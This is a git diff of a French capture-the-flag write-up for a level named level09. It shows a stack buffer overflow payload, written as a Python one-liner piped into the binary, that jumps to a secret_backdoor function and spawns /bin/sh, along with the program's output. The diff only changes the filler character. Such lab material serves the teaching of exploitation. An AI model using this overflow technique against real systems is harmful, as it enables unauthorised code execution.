@@ -22,12 +22,12 @@ On récupère l'adresse de la fonction secret_backdoor -> 0x000055555555488c
 
 On crée le crack: 40 (username) + \xff (255 dans le strncpy) + \n + 200 (offset rbp + rsp) + 0x000055555555488c (adresse secret_backdoor) + \n + /bin/sh (terminal)
 
-(python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09
+(python -c 'print "a"*40+"\xff"+"\n"+"a"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
 >: Enter your username
->>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB>: Msg @Unix-Dude
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>: Msg @Unix-Dude
 >>: >: Msg sent!
 whoami
 end
